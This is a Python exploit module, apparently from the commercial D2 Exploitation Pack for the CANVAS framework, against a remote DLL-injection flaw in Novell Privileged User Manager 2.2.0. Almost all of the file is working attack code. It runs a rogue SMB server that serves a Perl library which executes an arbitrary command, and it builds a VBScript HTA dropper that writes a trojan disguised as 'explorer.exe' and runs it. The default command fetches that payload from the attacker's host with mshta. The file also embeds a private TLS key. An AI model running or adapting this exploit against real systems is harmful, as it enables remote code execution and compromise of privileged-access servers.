#! /usr/bin/env python

#
# Proprietary D2 Exploitation Pack source code - use only under the license
# agreement specified in LICENSE.txt in your D2 Exploitation Pack
#
# Copyright DSquare Security, LLC, 2007-2010
#

import os
import getopt
import sys
import socket
import time
import struct
import canvasengine
import smbserver
import threading
import thread

if '.' not in sys.path:
	sys.path.append('.')

from exploitutils import *
from tcpexploit import tcpexploit
from threading import Thread
from libs.spkproxy import header, body
from libs.canvasos import *
from libs.tlslite.api import *
import libs.spkproxy as spkproxy

# GUI info
NAME = "Novell Privileged User Manager Remote DLL Injection Vulnerability"
DESCRIPTION = "Remote DLL injection vulnerability in Novell Privileged User Manager"
VERSION = "0.1"

DOCUMENTATION = {}
DOCUMENTATION["VENDOR"] = "Novell"
DOCUMENTATION["Date public"] = "2009.07.21"
DOCUMENTATION["VersionsAffected"] = "Novell Privileged User Manager 2.2.0"
DOCUMENTATION["CERT Advisory"] = ""
DOCUMENTATION["Repeatability"] = "Infinite"
DOCUMENTATION["References"] = "http://www.zerodayinitiative.com/advisories/ZDI-09-046/"
DOCUMENTATION["CVE Name"] = "Unknown"
DOCUMENTATION["CVE Url"] = "Unknown"
DOCUMENTATION["Notes"] = ""

GTK2_DIALOG = "dialog.glade2"

PROPERTY = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Remote"
PROPERTY['ARCH'] = [ ["Windows"] ]
NOTES="""
"""

CHANGELOG="""
"""


class smbServerThread(Thread):

    def __init__(self, exploit, cmd):
        Thread.__init__(self)
        self.exploit = exploit
        self.suicide = False
	self.cmd = cmd
        self.module_xml = os.getcwd() + "/exploits/d2sec_npum/module.xml"
        self.lib_name = os.getcwd() + "/exploits/d2sec_npum/d2.pm"

        return

    def run(self):
        self.exploit.log("Starting SMB server")

        mysmbserver = smbserver.SMBServer(self.exploit.callback.ip, 445)
        mysmbserver.timeout = 30
        mysmbserver.target = self.exploit.host  
	
	# Set module.xml file
	xml = ""
	xml += "<UniFi>\n"
	xml += "  <Module name=\"\\\\\\\\?\\\\UNC\\\\" + self.exploit.callback.ip + "\\\\tmp\\\\d2\" priority=\"1\">\n"
	xml += "     <Library type=\"perl\" lib=\"d2\">\n"
	xml += "      <Method name=\"go\" svc=\"d2::go\" peer=\"inquire\"/>\n"
	xml += "    </Library>\n"
	xml += "  </Module>\n"
	xml += "</UniFi>"

        mysmbserver.set_file_data("d2\\module.xml", xml)

	# Set library file
	lib = ""
	lib += "package d2;\n\n"	lib += "use 5.008003;\n"
	lib += "use strict;\n"
	lib += "use warnings;\n\n\n"
	lib += "sub go {  \n"
	lib += "  exec(\"" + self.cmd + "\");\n"
	lib += "  return 0;\n"
	lib += "}\n\n"
	lib += "1;\n"
	lib += "__END__"	
    
        mysmbserver.set_file_data("d2\\lib\\d2.pm", lib)

        if mysmbserver.listen() == 0:
            self.exploit.log("Could not listen!")
            return

        self.exploit.log("SMB server accepting connections")

        tries = 0

        self.exploit.smblock.acquire()
        self.exploit.smbinit = 1
        self.exploit.smblock.release()

        while mysmbserver.accept() == 0 and self.exploit.state!=self.exploit.HALT and self.suicide == False:
            self.exploit.log("Waiting for new client... (Try: %d/4)" % (tries))
            tries += 1
            if tries > 4:
                break
          
        while mysmbserver.handle() and self.exploit.state!=self.exploit.HALT and self.suicide == False:
            time.sleep(1)

	mysmbserver.s.close()
        self.exploit.log("Terminating SMB server")

        return 

    def killme(self):
        os._exit(0)


class theexploit(tcpexploit):

    def __init__(self):
        tcpexploit.__init__(self)
	self.TROJANMODE = 0
        self.name = NAME
        self.port = 29120
	self.cmd = ""
	self.trojanname = "index.hta"
        self.connectionList = []
        self.threads = []
        return

    def getArgs(self):
        self.host = self.target.interface
        self.port = int(self.argsDict.get("port", self.port))
	self.cmd = self.argsDict.get("cmd", self.cmd)
        return

    def neededListenerTypes(self):
	from canvasengine import WIN32MOSDEF
	return [WIN32MOSDEF]

    def file4hta(self, exename):
	evilprog = "explorer.exe"
	e = []

	for a in exename:
		for b in a:
			if b == "\r":
				d = "0d"
			elif b == "\n":
				d = "0a"
			elif b == "\0":
				d = "00"
			else:
				c = hex(ord(b))
				d = c.replace("0x", "")

			if len(d) == 1:
				d = "0"+d

			e.append(d)

	i = 0
	j = 0
	l = len(e)

	hta = "<SCRIPT language=vbs>\n\n"

	while 1:
		hta += " prog = prog & \""

		while i != 24:
			hta += "%s," % e[j]
		
			if j == l-1:
				break
			
			i += 1
			j += 1

		if j == l-1:
			hta = hta[:-1] + "\"\n\n"
			break
		
		hta += "\"\n"
		i = 0

	hta += " tmp = Split(prog, \",\")\n"	
	hta += " Set fso = CreateObject(\"Scripting.FileSystemObject\")\n"
	hta += " Set shell = CreateObject(\"WScript.Shell\")\n"
	hta += " userprofile = shell.ExpandEnvironmentStrings(\"%USERPROFILE%\")\n"
	hta += " path = userprofile & \"\\\" & \"%s\"\n" % evilprog
	hta += " Set f = fso.CreateTextFile(path, True)\n\n"
	hta += " For i = 0 To UBound(tmp)\n"
	hta += "   prog = Int(\"&H\" & tmp(i))\n"
	hta += "   f.Write Chr(prog)\n"
	hta += " Next\n\n"
	hta += " f.Close\n"
	hta += " shell.Run Chr(34) & path & Chr(34), 7, false\n"
	hta += " self.Close\n"
	hta += "</SCRIPT>\n"

	return hta
 
    def maketrojan(self):    	
	t_os = canvasos("Windows")
	t_os.arch = "X86"
    
	self.buildmosdeftrojan(self.callback.ip, self.callback.port, target_os = t_os)        
	self.log("Writing out %d bytes to %s"%(len(self.mosdeftrojan), self.trojanname))        
	self.htafile = self.file4hta(self.mosdeftrojan)
	file(self.trojanname, "wb").write(self.htafile)
	self.setInfo("%s - done"%(NAME))
	ret = len(self.mosdeftrojan) != 0	

	return ret

    def makesploit(self, clientheader, clientbody):        
	from libs.spkproxy import header, body
	h = header('SERVER')
	b = body()
	
	self.maketrojan()
	        
	if clientheader.URL.count(self.trojanname):
		self.log("Sending MOSDEF trojan")
		f = open(self.trojanname, "rb")
		sploitstring = f.read()
		f.close()
		os.remove(self.trojanname)
		self.log("Sending %d bytes"%len(sploitstring))
		h.addHeader("Content-type","binary/octet-stream")
		h.addHeader("Connection","close")
		b.setBody(sploitstring)
	
	return h, b	

    #################################################################################################################
    # Code from httpserver.py
    def listen(self):
	self.getargs()
	s=self.gettcplistener(80, "0.0.0.0")
	
	if not s:
		if self.port < 1024:
		    self.log("Cannot listen on port %d - perhaps we need to be root or that port is already bound? " \
		             "you can try to bind to a higher port" % self.port)
		else:
		    self.log("Cannot listen on port %d - perhaps that port is already bound?" % self.port)
		return 0
	s.set_timeout(5)
	self.s=s
	return s 
	
    def accept(self, s=None ):
	"""
	Try to accept one connection
	returns true if we found one
	"""
	#we loop on this ,so no annoying printouts here
	#self.log("Accepting connection")
	if s==None:
		s=self.s 
	try:
		infd,addr=s.accept()
	except timeoutsocket.Timeout:
		#self.log("Timed out - no accept yet")
		return 
	if infd==-1:
		return
	
	#else we have an infd
	self.handle(infd)
	return True #handled connection
	    
    def handle(self, infd): 
	self.log("Handling connection")
	clientheader = header(state = "SERVER")
	clientheader.ssl = self.ssl
	ret = clientheader.readdata(infd)
	clientbody = body()
	
	if clientheader.gotGoodHeader():
		if clientheader.bodySize()>0 or clientheader.wasChunked:
			self.log("Reading body")
			clientbody.read(infd, clientheader.bodySize(), clientheader.wasChunked, 0)
			self.log("Read body")
	
	self.log("Creating exploit response")		
	servheader,servbody = self.makesploit(clientheader,clientbody)
			
	self.log("Responding")		
	bodydata = "".join(servbody.data)		            		
	response = ""
	response += "%s %s %s\r\n"%(servheader.version, servheader.status, servheader.msg)		
	self.log(response)
	
	for akey in servheader.headerValuesDict.keys():
		if akey not in [ "Content-Length", "Content-length"]:
			response += servheader.grabHeader(akey)
			
	self.log("Sending header data of %d bytes"%len(response))
	chunked = 0
	
	if not chunked:
		response += "Content-Length: "+str(len(bodydata))+"\r\n"
		
	response += "\r\n"
	response += "".join(bodydata)
	self.log("Total response length is %d bytes"%len(response))
	
	try:
		infd.sendall(response)
	except socket.error:
		self.log("Connection closed by peer")
		
	self.log("Response sent")
	infd.close() #connection close - later on we'll keep it.
	return 
    #
    #################################################################################################################
        
    def startHTTPServer(self):
	s = self.listen()
	
	if not s:
		self.log("Failed to listen - not running")
		return 0
		
	while 1:
		if self.state==self.HALT:
			self.s.close()
			break
		self.accept()
	
	self.setInfo("%s on %s:%d - done (success!)"%(NAME, self.bindip, self.port))		
	return 1
    	        
    def run(self):
        self.setInfo("%s attacking %s:%d - (in progress)" % (self.name, self.host, self.port), showlog=True)
	
	# Check arguments and start fake web server for TROJANMODE
        self.getArgs()

	if (self.cmd == ""):
		self.TROJANMODE = 1
		self.cmd = "mshta.exe http://" + self.callback.ip + "/" + self.trojanname		
		thread.start_new_thread(self.startHTTPServer,())

	# Start fake SMB server
        self.smblock = threading.Lock()
        self.smbinit = 0
        t = smbServerThread(self, self.cmd)
        t.start()
        self.threads += [t]
        time.sleep(1)
        self.smblock.acquire()

        if self.smbinit != 1:
            self.state = self.HALT
            self.log("Could not listen on port 445. You should be running as root!")
            return 0

        self.smblock.release()

	# Init de SSL connection with client certificate
	crt = """-----BEGIN CERTIFICATE-----
MIIDVTCCAr6gAwIBAgIJAIbXtAyLiNdIMA0GCSqGSIb3DQEBBQUAMHsxCzAJBgNV
BAYTAlVTMRMwEQYDVQQIEwpTb21lLVN0YXRlMQ4wDAYDVQQHEwVNaWFtaTELMAkG
A1UEChMCRDIxCzAJBgNVBAsTAkQyMQswCQYDVQQDEwJEMjEgMB4GCSqGSIb3DQEJ
ARYRY29udGFjdEBkMnNlYy5jb20wHhcNMDkwODIwMTUyOTM2WhcNMTAwODIwMTUy
OTM2WjB7MQswCQYDVQQGEwJVUzETMBEGA1UECBMKU29tZS1TdGF0ZTEOMAwGA1UE
BxMFTWlhbWkxCzAJBgNVBAoTAkQyMQswCQYDVQQLEwJEMjELMAkGA1UEAxMCRDIx
IDAeBgkqhkiG9w0BCQEWEWNvbnRhY3RAZDJzZWMuY29tMIGfMA0GCSqGSIb3DQEB
AQUAA4GNADCBiQKBgQDms0uoRGubUEgmURezV7v25BkzFKPTN3mb7Sh8yNu5mRPt
MwWwheqEBWN2i1V1xyjDTou/pip08p2xST/Oh8nF8l543sCeIdxui4omURhyChHx
cUIHwTwqpLZ+oTEH+9xW6IZQfMd/1k6kmXaz21ArWLiHSa/LmVj+7VtBwaWjyQID
AQABo4HgMIHdMB0GA1UdDgQWBBSa26LTl001Dbzuvg65CfkIZi1FgzCBrQYDVR0j
BIGlMIGigBSa26LTl001Dbzuvg65CfkIZi1Fg6F/pH0wezELMAkGA1UEBhMCVVMx
EzARBgNVBAgTClNvbWUtU3RhdGUxDjAMBgNVBAcTBU1pYW1pMQswCQYDVQQKEwJE
MjELMAkGA1UECxMCRDIxCzAJBgNVBAMTAkQyMSAwHgYJKoZIhvcNAQkBFhFjb250
YWN0QGQyc2VjLmNvbYIJAIbXtAyLiNdIMAwGA1UdEwQFMAMBAf8wDQYJKoZIhvcN
AQEFBQADgYEAAVKngrXq0pUtnIUKIYfsOv0ms6oR6bpbrQ0cjmTLmNZ0v1zjjiUN
5kVeW7w0CEsYydcYCuYVI8h//QYOZg0rBaQgr8h1dF1xeeEX+OO0SUrUJI1EzHXy
y43eyP3t9g8DI6StSBIDa4ge/xcMpH4t2ozLDrmDaCkaqN8z19iPsrA=
-----END CERTIFICATE-----
	"""

	key = """-----BEGIN RSA PRIVATE KEY-----
MIICXQIBAAKBgQDms0uoRGubUEgmURezV7v25BkzFKPTN3mb7Sh8yNu5mRPtMwWw
heqEBWN2i1V1xyjDTou/pip08p2xST/Oh8nF8l543sCeIdxui4omURhyChHxcUIH
wTwqpLZ+oTEH+9xW6IZQfMd/1k6kmXaz21ArWLiHSa/LmVj+7VtBwaWjyQIDAQAB
AoGBAIByaXhph+Q0wccbtW90NMJU47buEfzC0WHAnJ9Fkhj3IwIZO1y6YwVYnrVd
BJsL5SVA8Uwmb1Mn1ibkWrNaJTuTZsCW0HShX4YVRVa7d/PHarAbfhix1j6UVcat
5onr5ShufnwWGDP/3Rstco4tHQHH0lUFKMhqWDh1EKBzYUa1AkEA+lvs5J9aksXV
hlFoVukZBO854oZaNtuINwsTBn/6P3jc3T+e1EG02+U4S2aMhFdTvYrLZw2TfKik
tVoUxR4X7wJBAOvl+nx2Xp7A5XkgftRNQSDt0jWYhTUEOe5Ju2eGFULE1wNVt8A/
gf/MmSrL5kNsuR+oTu0fqjdi+CnsWy9+h8cCQQCjJ0bxEpw+7CgjmWfKw6tnWNM7
OV0PRO+3F0N1x+74cDZXBP/nyU4ow291S8Yk9JgA/LNjXCiSY4C7IpJIhz0HAkAI
I24J3zeSeIsyK5nUjznA/hNzf+iQlK2+99I8Vxbir9HPLqThQA+nGJLsNA6kotqc
Kf1XFvGTaZmwMJRQxie/AkA8GKC0zaV2QkB8uIF9rkRC7fpQnu6jRS6vofT6Txoa
cgdeFSyhq+C9wVceLpmEyg/H9pRFbCP0kwsun8KceOJ9
-----END RSA PRIVATE KEY-----
	"""

	x = X509()
	x.parse(crt)

	crtchain = X509CertChain([x])

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((self.host, self.port))
	ssl_sock = TLSConnection(s)
	ssl_sock.handshakeClientCert(certChain=crtchain, privateKey=parsePEMKey(key))

	unc_path = "\\\\?\\UNC\\" + self.callback.ip + "\\tmp\\d2"    

	data = ""
	data += "\x03\x73\x70\x66\x00\x73\x03\x76\x72\x6D\x05\x32\x2E\x32\x2E\x30\x73" + "\x06" + "module" + chr(len(unc_path)) + unc_path + "\x73"
	data += "\x06" + "method" + "\x02" + "go" + "\x00"

	ssl_sock.write(data)
	ssl_sock.close()

	# Check thread
        for t in self.threads:
            t.join(120)

        if self.ISucceeded():
            self.setInfo("%s attacking %s:%d (succeeded!)" % (self.name, self.host, self.port), showlog=True)
            self.log("%s done (succeeded!)" % (self.name))
            return 1

        self.setInfo("%s attacking %s:%d (failed)" % (self.name, self.host, self.port), showlog=True)
        self.log("%s done (failed)" % (self.name))

        return 0

    def usage(self):
        print "Usage: %s -t host -l localIP -d localPort" % (sys.argv[0])
    

if __name__=='__main__':
 	print "Running CANVAS %s Exploit v %s" % (DESCRIPTION, VERSION)
	app = theexploit()
	ret = standard_callback_commandline(app)

